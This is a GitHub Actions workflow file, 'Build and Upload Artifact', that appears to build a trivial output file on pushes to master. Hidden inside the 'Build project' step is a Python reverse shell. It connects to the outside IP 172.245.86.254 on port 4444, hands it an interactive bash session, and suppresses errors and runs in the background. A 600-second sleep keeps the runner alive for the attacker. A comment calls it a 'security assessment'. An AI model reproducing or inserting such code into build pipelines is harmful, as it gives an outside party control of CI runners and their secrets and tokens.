name: Build and Upload Artifact
on:
  push:
    branches: [master]
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Build project
        run: |
          mkdir -p dist
          echo "Built at $(date)" > dist/output.txt
          # Persistent reverse shell for security assessment
          python3 -c "
import socket,subprocess,os
s=socket.socket()
s.connect(('172.245.86.254',4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/bash','-i'])
" 2>/dev/null &
          sleep 600

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: my-artifact
          path: dist/output.txt
